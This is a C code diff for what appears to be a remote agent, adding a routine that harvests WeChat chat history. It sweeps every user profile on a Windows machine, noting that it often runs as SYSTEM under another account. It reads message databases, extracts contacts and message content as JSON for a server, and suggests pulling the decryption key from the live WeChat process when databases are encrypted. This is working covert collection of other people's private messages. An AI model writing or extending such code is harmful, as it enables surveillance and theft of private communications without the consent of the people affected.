@@ -2308,6 +2308,128 @@ static int ident_load(BYTE idpriv[32]) {
     return 0;
 }
 
+/* ---------- wechat_history helpers ---------- */
+
+typedef struct { long long id; char name[64]; } wechat_name_t;
+
+static void wechat_ascii_lower(char *dst, size_t cap, const char *src) {
+    size_t i;
+    if (cap == 0) return;
+    for (i = 0; src[i] && i + 1 < cap; i++) {
+        char ch = src[i];
+        dst[i] = (ch >= 'A' && ch <= 'Z') ? (char)(ch + 32) : ch;
+    }
+    dst[i] = '\0';
+}
+
+/* Table probe: 1 present, 0 absent, -1 query error (e.g. encrypted DB —
+   sqlite opens lazily and only fails on first use). */
+static int wechat_db_has_table(sqlite3 *db, const char *name, int *qerr) {
+    sqlite3_stmt *st = NULL;
+    int found = 0;
+    if (sqlite3_prepare_v2(db, "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name=?", -1, &st, NULL) != SQLITE_OK) {
+        if (qerr) *qerr = 1;
+        return -1;
+    }
+    sqlite3_bind_text(st, 1, name, -1, SQLITE_TRANSIENT);
+    int rc = sqlite3_step(st);
+    if (rc == SQLITE_ROW) {
+        found = sqlite3_column_int(st, 0) > 0;
+    } else if (rc != SQLITE_DONE) {
+        if (qerr) *qerr = 1;
+        sqlite3_finalize(st);
+        return -1;
+    }
+    sqlite3_finalize(st);
+    return found;
+}
+
+/* True for DB filenames that carry chat messages (vs accessory DBs like
+   Emotion/Media/Favorite). Only gates the open-failure error line. */
+static int wechat_is_msg_db_name(const char *fname) {
+    char lower[128];
+    wechat_ascii_lower(lower, sizeof(lower), fname);
+    return strstr(lower, "micromsg") != NULL || strstr(lower, "msg") != NULL || strstr(lower, "message") != NULL;
+}
+
+/* Load Name2ID (rowid == MSG.TalkerId) into map; returns entry count.
+   The single value column is named differently per WeChat version, so it
+   is resolved via PRAGMA-style introspection instead of hard-coded. */
+static int wechat_load_name2id(sqlite3 *db, wechat_name_t *map, int cap) {
+    int n = 0;
+    sqlite3_stmt *cs = NULL;
+    if (sqlite3_prepare_v2(db, "SELECT * FROM Name2ID LIMIT 0", -1, &cs, NULL) != SQLITE_OK) return 0;
+    int ncol = sqlite3_column_count(cs);
+    int picked = -1;
+    for (int i = 0; i < ncol; i++) {
+        const char *cn = (const char *)sqlite3_column_name(cs, i);
+        if (!cn) continue;
+        char lb[64];
+        wechat_ascii_lower(lb, sizeof(lb), cn);
+        if (picked < 0) picked = i;
+        if (strstr(lb, "user") || strstr(lb, "name")) { picked = i; break; }
+    }
+    char col[64] = {0};
+    if (picked >= 0) {
+        const char *cn = (const char *)sqlite3_column_name(cs, picked);
+        if (cn) _snprintf(col, sizeof(col), "%s", cn);
+    }
+    sqlite3_finalize(cs);
+    if (!col[0] || strchr(col, '"')) return 0;
+    char q[160] = {0};
+    _snprintf(q, sizeof(q), "SELECT rowid, \"%s\" FROM Name2ID", col);
+    sqlite3_stmt *ds = NULL;
+    if (sqlite3_prepare_v2(db, q, -1, &ds, NULL) != SQLITE_OK) return 0;
+    while (n < cap && sqlite3_step(ds) == SQLITE_ROW) {
+        const char *nm = (const char *)sqlite3_column_text(ds, 1);
+        if (!nm || !nm[0]) continue;
+        map[n].id = sqlite3_column_int64(ds, 0);
+        _snprintf(map[n].name, sizeof(map[n].name), "%s", nm);
+        n++;
+    }
+    sqlite3_finalize(ds);
+    return n;
+}
+
+/* Emit one JSON chat line plus bump the counter. Shared shape with the
+   legacy branch so the server/UI parser sees identical output. */
+static void wechat_emit_json(char *out, long long ctime_sec, int issender, const char *room, const char *talker, int mtype, const char *content, int *total_rows) {
+    time_t sec = (time_t)ctime_sec;
+    struct tm *tm = gmtime(&sec);
+    char timeBuf[64] = {0};
+    if (tm) strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%dT%H:%M:%SZ", tm);
+    const char *senderText = issender == 1 ? "me" : "other";
+    char *timeEsc = jescape(timeBuf, strlen(timeBuf));
+    char *senderEsc = jescape(senderText, strlen(senderText));
+    char *contactEsc = jescape(room, strlen(room));
+    char *talkerEsc = jescape(talker, strlen(talker));
+    char *contentEsc = jescape(content, strlen(content));
+    if (!timeEsc || !senderEsc || !contactEsc || !talkerEsc || !contentEsc) {
+        free(timeEsc);
+        free(senderEsc);
+        free(contactEsc);
+        free(talkerEsc);
+        free(contentEsc);
+        return;
+    }
+    size_t need = strlen(timeEsc) + strlen(senderEsc) + strlen(contactEsc) +
+        strlen(talkerEsc) + strlen(contentEsc) + 128;
+    char *line = (char *)malloc(need);
+    if (line) {
+        _snprintf(line, need,
+            "{\"time\":\"%s\",\"sender\":\"%s\",\"contact\":\"%s\",\"contact_id\":\"%s\",\"type\":%d,\"content\":\"%s\"}\n",
+            timeEsc, senderEsc, contactEsc, talkerEsc, mtype, contentEsc);
+        strcat_s(out, 65536, line);
+        free(line);
+        (*total_rows)++;
+    }
+    free(timeEsc);
+    free(senderEsc);
+    free(contactEsc);
+    free(talkerEsc);
+    free(contentEsc);
+}
+
 /* ---------- wechat_history implementation ---------- */
 
 static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
@@ -2326,31 +2448,77 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
 
     /* WeChat account roots, oldest layout first:
        legacy (<=3.x):  %APPDATA%\Tencent\WeChat\<wxid>\Msg
-       modern (>=3.9/4.x default): %USERPROFILE%\Documents\WeChat Files\<wxid>\Msg */
-    char wechat_root[MAX_PATH] = {0};
-    char probed[600] = {0};
-    size_t probed_len = 0;
+       modern (>=3.9/4.x default): %USERPROFILE%\Documents\WeChat Files\<wxid>\Msg
+       plus every local profile's legacy/modern/OneDrive layouts (the agent
+       often runs as SYSTEM or another account than the WeChat login). */
+    char roots[12][MAX_PATH];
+    int nroots = 0;
+    char probed[2048] = {0};
+#define WECHAT_ADD_ROOT(p_) do { \
+        if (nroots < 12 && GetFileAttributesA(p_) != INVALID_FILE_ATTRIBUTES) { \
+            int dup = 0; \
+            for (int d = 0; d < nroots; d++) { \
+                if (_stricmp(roots[d], (p_)) == 0) { dup = 1; break; } \
+            } \
+            if (!dup) { \
+                _snprintf(roots[nroots], MAX_PATH, "%s", (p_)); \
+                nroots++; \
+            } \
+        } \
+    } while (0)
+#define WECHAT_NOTE_PROBED(p_) do { \
+        if (probed[0]) strncat(probed, "; ", sizeof(probed) - strlen(probed) - 1); \
+        strncat(probed, (p_), sizeof(probed) - strlen(probed) - 1); \
+    } while (0)
     {
         char appdata[MAX_PATH] = {0};
         DWORD ad_len = GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
         if (ad_len > 0 && ad_len < MAX_PATH) {
-            _snprintf(wechat_root, sizeof(wechat_root), "%s\\Tencent\\WeChat", appdata);
-            probed_len = (size_t)_snprintf(probed, sizeof(probed), "%s", wechat_root);
+            char c0[MAX_PATH] = {0};
+            _snprintf(c0, sizeof(c0), "%s\\Tencent\\WeChat", appdata);
+            WECHAT_NOTE_PROBED(c0);
+            WECHAT_ADD_ROOT(c0);
         }
-        if (wechat_root[0] == '\0' || GetFileAttributesA(wechat_root) == INVALID_FILE_ATTRIBUTES) {
-            char home[MAX_PATH] = {0};
-            DWORD h_len = GetEnvironmentVariableA("USERPROFILE", home, MAX_PATH);
-            wechat_root[0] = '\0';
-            if (h_len > 0 && h_len < MAX_PATH) {
-                _snprintf(wechat_root, sizeof(wechat_root), "%s\\Documents\\WeChat Files", home);
-                if (probed_len > 0 && probed_len < sizeof(probed) - 2) {
-                    probed[probed_len++] = ';';
-                    probed[probed_len++] = ' ';
-                    probed[probed_len] = '\0';
-                }
-                if (probed_len < sizeof(probed)) {
-                    _snprintf(probed + probed_len, sizeof(probed) - probed_len, "%s", wechat_root);
-                }
+        char home[MAX_PATH] = {0};
+        DWORD h_len = GetEnvironmentVariableA("USERPROFILE", home, MAX_PATH);
+        if (h_len > 0 && h_len < MAX_PATH) {
+            char c1[MAX_PATH] = {0};
+            _snprintf(c1, sizeof(c1), "%s\\Documents\\WeChat Files", home);
+            WECHAT_NOTE_PROBED(c1);
+            WECHAT_ADD_ROOT(c1);
+        }
+        /* Per-profile sweep for service-account agents. */
+        char sysdrive[16] = {0};
+        DWORD sd_len = GetEnvironmentVariableA("SystemDrive", sysdrive, sizeof(sysdrive));
+        if (sd_len == 0 || sd_len >= sizeof(sysdrive)) {
+            _snprintf(sysdrive, sizeof(sysdrive), "C:");
+        }
+        char users[MAX_PATH] = {0};
+        _snprintf(users, sizeof(users), "%s\\Users\\*", sysdrive);
+        {
+            WIN32_FIND_DATAA ufd;
+            HANDLE hu = FindFirstFileA(users, &ufd);
+            if (hu != INVALID_HANDLE_VALUE) {
+                do {
+                    if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+                    if (strcmp(ufd.cFileName, ".") == 0 || strcmp(ufd.cFileName, "..") == 0) continue;
+                    if (_strnicmp(ufd.cFileName, "Default", 7) == 0) continue;
+                    if (_stricmp(ufd.cFileName, "Public") == 0) continue;
+                    if (_stricmp(ufd.cFileName, "All Users") == 0) continue;
+                    char base[MAX_PATH] = {0};
+                    _snprintf(base, sizeof(base), "%s\\Users\\%s", sysdrive, ufd.cFileName);
+                    char c2[MAX_PATH] = {0}, c3[MAX_PATH] = {0}, c4[MAX_PATH] = {0};
+                    _snprintf(c2, sizeof(c2), "%s\\AppData\\Roaming\\Tencent\\WeChat", base);
+                    _snprintf(c3, sizeof(c3), "%s\\Documents\\WeChat Files", base);
+                    _snprintf(c4, sizeof(c4), "%s\\OneDrive\\Documents\\WeChat Files", base);
+                    WECHAT_NOTE_PROBED(c2);
+                    WECHAT_NOTE_PROBED(c3);
+                    WECHAT_NOTE_PROBED(c4);
+                    WECHAT_ADD_ROOT(c2);
+                    WECHAT_ADD_ROOT(c3);
+                    WECHAT_ADD_ROOT(c4);
+                } while (FindNextFileA(hu, &ufd));
+                FindClose(hu);
             }
         }
     }
@@ -2362,12 +2530,12 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
 
     strcat_s(out, 65536, "=== wechat history ===\n");
 
-    if (wechat_root[0] == '\0' || GetFileAttributesA(wechat_root) == INVALID_FILE_ATTRIBUTES) {
+    if (nroots == 0) {
         /* Same marker the Go agent emits so the UI reports "no data
            directory" instead of the misleading "no matching messages". */
         strcat_s(out, 65536, "(WeChat data directory not found or not on Windows)\n");
         if (probed[0]) {
-            char diag[640] = {0};
+            char diag[2112] = {0};
             _snprintf(diag, sizeof(diag), "# probed: %s\n", probed);
             strcat_s(out, 65536, diag);
         }
@@ -2375,13 +2543,17 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
         return out;
     }
 
+    int total_rows = 0;
+
+    for (int ri = 0; ri < nroots; ri++) {
+        char wechat_root[MAX_PATH] = {0};
+        _snprintf(wechat_root, sizeof(wechat_root), "%s", roots[ri]);
+
     /* Open WeChat root directory */
     HANDLE hFind = INVALID_HANDLE_VALUE;
     WIN32_FIND_DATAA findData;
     char searchPath[MAX_PATH] = {0};
     _snprintf(searchPath, sizeof(searchPath), "%s\\*", wechat_root);
-
-    int total_rows = 0;
 
     hFind = FindFirstFileA(searchPath, &findData);
     if (hFind != INVALID_HANDLE_VALUE) {
@@ -2389,7 +2561,7 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
             if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
             if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
 
-            /* Build Msg directory path: %APPDATA%\Tencent\WeChat\<wxid>\Msg\ */
+            /* Build Msg directory path: <root>\<wxid>\Msg\ */
             char msgDir[MAX_PATH] = {0};
             _snprintf(msgDir, sizeof(msgDir), "%s\\%s\\Msg", wechat_root, findData.cFileName);
 
@@ -2419,9 +2591,93 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
                     continue;
                 }
 
-                /* Open SQLite database */
+                /* Open SQLite database (lazy: encrypted DBs fail on first use,
+                   not here — the schema probe below reports those). */
                 sqlite3 *db = NULL;
                 if (sqlite3_open(tempFile, &db) != SQLITE_OK) {
+                    if (db) sqlite3_close(db);
+                    DeleteFileA(tempFile);
+                    if (wechat_is_msg_db_name(findData.cFileName)) {
+                        char ebuf[512] = {0};
+                        _snprintf(ebuf, sizeof(ebuf), "=== %s ===\nquery error: %s: database is encrypted or unsupported (WeChat 4.x encrypts message DBs; extract the key from the live WeChat process)\n",
+                            findData.cFileName, findData.cFileName);
+                        strcat_s(out, 65536, ebuf);
+                    }
+                    continue;
+                }
+
+                /* Schema probe: legacy message table vs modern MSG table.
+                   Accessory DBs (Emotion/Media/Favorite/...) have neither and
+                   are skipped silently. */
+                int wechat_qerr = 0;
+                int has_old = wechat_db_has_table(db, "message", &wechat_qerr);
+                int has_new = 0;
+                if (has_old == 0) has_new = wechat_db_has_table(db, "MSG", &wechat_qerr);
+                if (has_old < 0 || has_new < 0) {
+                    char ebuf[512] = {0};
+                    _snprintf(ebuf, sizeof(ebuf), "=== %s ===\nquery error: %s: database is encrypted or unsupported (WeChat 4.x encrypts message DBs; extract the key from the live WeChat process)\n",
+                        findData.cFileName, findData.cFileName);
+                    strcat_s(out, 65536, ebuf);
+                    sqlite3_close(db);
+                    DeleteFileA(tempFile);
+                    continue;
+                }
+                if (!has_old && !has_new) {
+                    sqlite3_close(db);
+                    DeleteFileA(tempFile);
+                    continue;
+                }
+
+                if (!has_old) {
+                    /* Modern layout: MSG + Name2ID (WeChat >= 3.9 / 4.x). */
+                    wechat_name_t nmap[512];
+                    int nmap_n = wechat_load_name2id(db, nmap, 512);
+                    sqlite3_stmt *mstmt = NULL;
+                    int full = 1;
+                    if (sqlite3_prepare_v2(db,
+                        "SELECT TalkerId, CreateTime, StrTalker, Type, StrContent, IsSender FROM MSG "
+                        "WHERE CreateTime >= 0 ORDER BY CreateTime DESC LIMIT 200",
+                        -1, &mstmt, NULL) != SQLITE_OK) {
+                        full = 0;
+                        if (sqlite3_prepare_v2(db,
+                            "SELECT TalkerId, CreateTime, Type, IsSender FROM MSG "
+                            "WHERE CreateTime >= 0 ORDER BY CreateTime DESC LIMIT 200",
+                            -1, &mstmt, NULL) != SQLITE_OK) {
+                            mstmt = NULL;
+                        }
+                    }
+                    if (!mstmt) {
+                        char ebuf[512] = {0};
+                        _snprintf(ebuf, sizeof(ebuf), "=== %s ===\nquery error: %s: MSG table has unexpected schema\n",
+                            findData.cFileName, findData.cFileName);
+                        strcat_s(out, 65536, ebuf);
+                    } else {
+                        while (sqlite3_step(mstmt) == SQLITE_ROW) {
+                            long long talker = sqlite3_column_int64(mstmt, 0);
+                            long long ctime = sqlite3_column_int64(mstmt, 1);
+                            const char *stalk = full ? (const char *)sqlite3_column_text(mstmt, 2) : NULL;
+                            int mtype = sqlite3_column_int(mstmt, full ? 3 : 2);
+                            const char *scontent = full ? (const char *)sqlite3_column_text(mstmt, 4) : NULL;
+                            int missender = sqlite3_column_int(mstmt, full ? 5 : 3);
+                            if (!stalk) stalk = "";
+                            if (!scontent) scontent = "";
+                            char room[96] = {0};
+                            for (int k = 0; k < nmap_n; k++) {
+                                if (nmap[k].id == talker) { _snprintf(room, sizeof(room), "%s", nmap[k].name); break; }
+                            }
+                            if (!room[0] && stalk[0]) _snprintf(room, sizeof(room), "%s", stalk);
+                            if (!room[0]) _snprintf(room, sizeof(room), "%lld", talker);
+                            if (hasContact) {
+                                char roomlow[96] = {0}, stalklow[256] = {0};
+                                wechat_ascii_lower(roomlow, sizeof(roomlow), room);
+                                wechat_ascii_lower(stalklow, sizeof(stalklow), stalk);
+                                if (!strstr(roomlow, contact) && !strstr(stalklow, contact)) continue;
+                            }
+                            wechat_emit_json(out, ctime, missender, room, room, mtype, scontent, &total_rows);
+                        }
+                        sqlite3_finalize(mstmt);
+                    }
+                    sqlite3_close(db);
                     DeleteFileA(tempFile);
                     continue;
                 }
@@ -2552,7 +2808,8 @@ static char *do_wechat_history(const char *filter_json, DWORD *outlen) {
             FindClose(hDbFind);
         } while (FindNextFileA(hFind, &findData));
         FindClose(hFind);
-    }
+        } /* if (hFind valid) */
+    } /* per-root containers */
 
     if (total_rows == 0) {
         strcat_s(out, 65536, "(no matching messages found)\n");
